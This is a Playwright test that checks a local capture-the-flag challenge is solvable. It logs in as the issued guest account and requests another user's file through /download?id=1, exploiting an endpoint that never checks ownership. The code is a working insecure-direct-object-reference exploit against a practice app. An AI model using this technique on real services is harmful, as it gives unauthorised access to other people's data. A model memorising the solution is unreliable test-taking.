import { test, expect } from '@playwright/test'
import { READY_TIMEOUT_MS } from './timeouts'
import { exposeCarrierDecoder, type CarrierDecoder } from '../__helpers__/carrierCookies'

const BASE_URL = 'http://localhost:5173/challenge/door-is-open/'
const FLAG_REGEX = /(FLAG|CTF)\{[^}]+\}/
const EXPLOIT_PATH = '/download?id=1'
// The session cookie is an opaque server-side token, so the exploit has to sign
// in for real with the account the engagement issued rather than forge one.
const ISSUED_ACCOUNT = { username: 'guest', password: 'guest' }

test('door-is-open is solvable via /download?id=1', async ({ page }) => {
  await exposeCarrierDecoder(page)
  await page.goto(BASE_URL)
  await page.waitForFunction(
    () =>
      navigator.serviceWorker.controller !== null &&
      typeof (globalThis as { __wxlDispatch?: unknown }).__wxlDispatch === 'function',
    null,
    { timeout: READY_TIMEOUT_MS },
  )

  const flagBody = await page.evaluate(
    async ({ downloadPath, issued }) => {
      const dispatch = (globalThis as unknown as {
        __wxlDispatch?: (req: Request) => Promise<Response>
      }).__wxlDispatch
      if (!dispatch) {
        throw new Error('__wxlDispatch not exposed on the page')
      }
      const base = 'https://challenge-door-is-open.localhost'
      // The carrier holds base64 segments, so the raw header value is not a
      // Set-Cookie string. Decode through the shared module rather than
      // parsing it here: a second definition of the format is what let this
      // spec stop passing without anyone noticing.
      const decodeCarrier = (globalThis as unknown as {
        __wxlDecodeCarrier: CarrierDecoder
      }).__wxlDecodeCarrier

      // X-Wxlsh-Cookie / X-Wxlsh-Set-Cookie are the forbidden-header transports
      // used by the wxl runtime (see usePythonRuntime.ts).
      const loginRes = await dispatch(
        new Request(`${base}/login`, {
          method: 'POST',
          headers: { 'content-type': 'application/x-www-form-urlencoded' },
          body: new URLSearchParams(issued).toString(),
        }),
      )
      const setCookie = await decodeCarrier(loginRes.headers.get('x-wxlsh-set-cookie') ?? '')
      const token = setCookie.map((c) => /fh_session=([^;\s]+)/.exec(c)?.[1]).find(Boolean)
      if (!token) throw new Error(`login failed for ${issued.username}`)

      // The download endpoint checks that the file ID exists but never that the
      // signed-in account owns it — file 1 belongs to the administrator.
      const res = await dispatch(
        new Request(`${base}${downloadPath}`, {
          method: 'GET',
          headers: { 'X-Wxlsh-Cookie': `fh_session=${token}` },
        }),
      )
      return await res.text()
    },
    { downloadPath: EXPLOIT_PATH, issued: ISSUED_ACCOUNT },
  )

  expect(flagBody.trim()).toMatch(FLAG_REGEX)
})
